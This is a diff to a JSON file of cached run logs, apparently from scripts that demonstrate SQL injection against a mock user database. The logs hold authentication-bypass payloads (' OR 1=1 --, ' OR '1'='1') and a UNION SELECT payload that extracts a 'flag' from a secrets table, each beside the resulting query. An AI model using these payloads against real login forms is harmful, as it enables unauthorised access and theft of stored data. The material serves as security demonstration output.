@@ -66,5 +66,13 @@
     "c93c972072eee4318110640891f14211289684a035699a9d102823f7dfd3fa0b": {
         "success": true,
         "logs": "--- SQL Injection Exploit Demonstration ---\n\nAttempting login for username: '' OR 1=1 --'\nExecuting SQL: SELECT * FROM users WHERE user = '' OR 1=1 --'\nQuery result: [('admin', 'securepassword'), ('testuser', 'testpass')]\n\n--- Comparison with a legitimate login attempt ---\n\nAttempting login for username: 'admin'\nExecuting SQL: SELECT * FROM users WHERE user = 'admin'\nQuery result: [('admin', 'securepassword')]\n\n--- Comparison with a failed login attempt ---\n\nAttempting login for username: 'nonexistent_user'\nExecuting SQL: SELECT * FROM users WHERE user = 'nonexistent_user'\nQuery result: []\n"
+    },
+    "61905b82b283e37cab5e1e5674a6b8087c7d8bbb1376502095a669a7e9215361": {
+        "success": true,
+        "logs": "--- Demonstrating SQL Injection (Authentication Bypass) ---\nAttempting login with payload: '' OR '1'='1'\n[MOCK DB] Executing SQL query: SELECT * FROM users WHERE user = '' OR '1'='1'\n[MOCK DB] Query successful! Authentication bypassed.\n\n--- Demonstrating SQL Injection (Data Exfiltration Example) ---\nAttempting login with payload: '' UNION SELECT flag, NULL FROM secrets --'\n[MOCK DB] Executing SQL query: SELECT * FROM users WHERE user = '' UNION SELECT flag, NULL FROM secrets --'\n[MOCK DB] Query successful! Data exfiltration attempted.\n\n--- Demonstrating Normal Login (for comparison) ---\nAttempting login with normal username: 'legit_user'\n[MOCK DB] Executing SQL query: SELECT * FROM users WHERE user = 'legit_user'\n[MOCK DB] Query executed. (No specific injection detected)\n"
+    },
+    "22ac87066d163e63be4ddafa25e84fdc84704ea59769323bccff493bdcf3c080": {
+        "success": true,
+        "logs": "--- Demonstrating SQL Injection (Authentication Bypass) ---\nAttempting login with payload: '' OR '1'='1'\n[MOCK DB] Executing SQL query: SELECT * FROM users WHERE user = '' OR '1'='1'\n[MOCK DB] Query successful! Authentication bypassed.\n\n--- Demonstrating SQL Injection (Data Exfiltration Example) ---\nAttempting login with payload: '' UNION SELECT flag, NULL FROM secrets --'\n[MOCK DB] Executing SQL query: SELECT * FROM users WHERE user = '' UNION SELECT flag, NULL FROM secrets --'\n[MOCK DB] Query successful! Data exfiltration attempted.\n\n--- Demonstrating Normal Login (for comparison) ---\nAttempting login with normal username: 'legit_user'\n[MOCK DB] Executing SQL query: SELECT * FROM users WHERE user = 'legit_user'\n[MOCK DB] Query executed. (No specific injection detected)\n"
     }
 }
